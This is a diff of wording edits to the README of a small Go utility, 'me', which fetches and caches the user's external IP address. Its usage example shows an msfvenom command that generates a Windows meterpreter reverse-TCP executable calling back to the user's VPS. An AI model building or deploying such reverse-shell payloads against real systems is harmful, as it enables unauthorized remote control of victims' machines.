@@ -7,11 +7,11 @@ go install github.com/cokeBeer/me@latest
 ```
 
 ## Usage
-For example, we can generate a meterpreter on your VPS and fill the `LHOST` parameter simply by `me`
+For example, we can generate a meterpreter on VPS and fill the `LHOST` parameter simply by `me`
 ```
 msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=`me` LPORT=4444 >mp.exe
 ```
-Your will never need to query your external ip and paste it.
+Your will never need to query your external ip and paste it again.
 
 ## how it work
 For the first time, `me` will request some apis to get your external ip and save the ip to `$USER/.myexternalip`.
